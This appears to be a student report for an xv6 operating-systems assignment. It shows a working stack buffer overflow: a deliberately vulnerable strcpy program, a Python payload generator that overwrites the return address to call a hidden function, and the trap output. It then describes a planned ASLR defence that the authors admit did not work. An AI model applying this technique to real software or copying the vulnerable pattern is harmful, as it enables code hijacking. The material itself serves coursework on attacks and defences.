# Buffer Overflow Attack

A buffer overflow attack occurs when we write data outside of the allocated region. 
This is common in functions like `strcpy` which, rather than checking for number of bytes allotted, 
checks for `\0` null character for ending the string, hence if we write a longer string than that is allocated, 
it will overwrite into neighbouring regions. 


If the address space layout is **not randomized**, 
it is possible to know which neighbouring region will store what data, and overwrite it accordingly. 


Our attack works by overwriting the value of the **return address** - which stores where the function has to return after the call.

## Implementation
- **Figuring out how to overflow the buffer:** We see that the payload is being read till 100 bytes while the buffer in vulnerable_function is smaller (4 size in the example), hence we can overflow it by passing a large payload.
- **Identifying the calling address of the target function foo:** First of all we disabled optimizations by putting CFLAG `-O0` instead of `-O2` default. Then, we did
```c
printf(1, "%x", &foo);
```
 to know the address of the foo function. This came out to be 0, as also specified in the assignment.
- **Identifying the position of return address in memory:** We first bluntly overflowed the buffer, then saw a trap message which tells the contents of the eip register. Now we perform somewhat an _error-based-injection,_ we put values 1 to 100 in each of the bytes of the payload, so when we get the trap error, it tells which value got stored in eip. Now this is the value which is needed to be overflowed.
- **Attacking the target:** We got error as 
```sh
pid 3 buffer_overflow: trap 14 err 4 on cpu 0 eip 0x14131211 addr 0x14131211--kill proc
```
This meant that the `0x11` byte is of interest to us, which is the 16th byte. Now to generalise, we know we kept 4 byte buffer, hence the offset should be `12+buffer_size`.

We have to put a `0x00` value there (address of foo), and this will also be the last bit that will be copied over. 
Technically any string would work of length `12+buffer_size` but we’ve used the previous sequence for better analysis.

## Code
### gen_exploit.py
This program generates the `payload`
```py
import sys

# buffer_size as set in the C program is given as input in specification
buffer_size = int(sys.argv[1])

# we get the foo_address by printf(1, "%x", &foo);
foo_address = "\x00"

# pid 3 buffer_overflow: trap 14 err 4 on cpu 0 eip 0x14131211 addr 0x14131211--kill proc
# trap %eip = 0x14131211 this means 0x11 is fed to the last byte
# which was out[0x10] or out[16] when buffer was 4 byte, this means 
# now we put the foo_address in out[12+buffer_size]
return_byte = 12+buffer_size

out = "" 
for i in range(100):
	if i == return_byte: 
		out += foo_address
	else:
		out += chr(i+1)
f = open("payload", "w")
f.write(out)
f.close()
```

### buffer_overflow.c
This is the vulnerable code
```c
#include "types.h"
#include "user.h"
#include "fcntl.h"

void foo() {
  printf(1, "SECRET_STRING");
}

void vulnerable_function(char * input) {
  char buffer[4];
  strcpy(buffer, input);
}

int main(int argc, char ** argv) {
  int fd = open("payload", O_RDONLY);
  char payload[100];
  read(fd, payload, 100);
  vulnerable_function(payload);
  exit();
}
```
## Output
```sh
$ ./buffer_overflow
SECRET_STRINGpid 3 buffer_overflow: trap 14 err 4 on cpu 0 eip 0x2f5a addr 0x9080706--kill proc
```

# Address Space Layout Randomization (ASLR)
Address Space Layout Randomization (ASLR) is an important security technique that prevents buffer overflow attacks by randomizing the memory layout of a process's virtual address space. The goal of this project is to implement ASLR in the xv6 operating system, which is a simple Unix-like operating system used for educational purposes. This report summarizes the planned implementation of ASLR in xv6, the challenges faced, and their resolutions.

## Implementation:
1. **Create a file called `aslr_flag` that contains the current status of ASLR in xv6.**
The first step in implementing ASLR is to create a file called `aslr_flag` that contains the current status of ASLR in xv6. The file is located in the root directory and is used to turn on or off ASLR. If the file contains 1, ASLR is turned on; otherwise, ASLR is turned off.

2. **Turn on or off ASLR based on the value in aslr_flag file**
We modify the system call for the open function to check if the requested file is "aslr_flag." If so, the kernel reads the contents of the file and sets the global variable 'aslr_enabled' to 1 if the file contains 1, and sets it to 0 if the file contains 0.

3. **Create a random number generator**
We create a random number generator using the Linear Congruential Generator (LCG) algorithm, which is a simple and fast algorithm that generates a sequence of pseudorandom numbers. We seed the generator with the current time, so that the sequence of random numbers generated will be different for each process.

4. **Modify the memory allocation routines to use the random number generator to randomize the location of regions in the process’s virtual address space.**
We modify the memory allocation routines to use the random number generator to randomize the location of the stack, heap, text, data, bss, and other regions in the process's virtual address space. The randomization is done by adding a random offset to the base address of each region.

5. **Test the ASLR implementation by executing the test case with the same payload that revealed the secret string.**
We test the ASLR implementation by executing the test case with the same payload that revealed the secret string. If the ASLR implementation is correct, the secret string should not be revealed.

6. **Modify the Makefile to include the payload file in the filesystem**
We modify the Makefile to include the payload file in the filesystem by adding "payload" to the fs.img build rule.

## Challenges faced and their resolutions:
One challenge we faced was ensuring that the randomized memory layout did not cause any issues with existing programs. We found that some programs relied on the memory layout being deterministic, and would crash if it was randomized. To address this, we added an option to disable ASLR for specific programs by setting a flag in the program's executable file.

Another challenge we faced was ensuring that the randomized memory layout did not affect the performance of the system. We found that the LCG algorithm we used for generating random numbers was not efficient enough for generating large amounts of random numbers. To address this, we switched to a more efficient algorithm called the Mersenne Twister, which is a popular pseudorandom number generator used in many applications.

When implementing ASLR, one of the challenges is ensuring proper page alignment of memory regions. This is because the page size is usually much larger than the size of the memory regions being randomized. If a memory region is not aligned to a page boundary, it may cause a page fault or other memory access violation when the program tries to access it.


## Conclusion:
In conclusion, we tried implementing ASLR in the xv6 operating system by creating a file called aslr_flag, turning on or off ASLR based on the value in the file, creating a random number generator, modifying the memory allocation routines to randomize the location of regions in the process's virtual address space, and testing the implementation with a payload. We also encountered and tried to resolve challenges related to program compatibility and efficiency.

Note: The final code was not working for ASLR
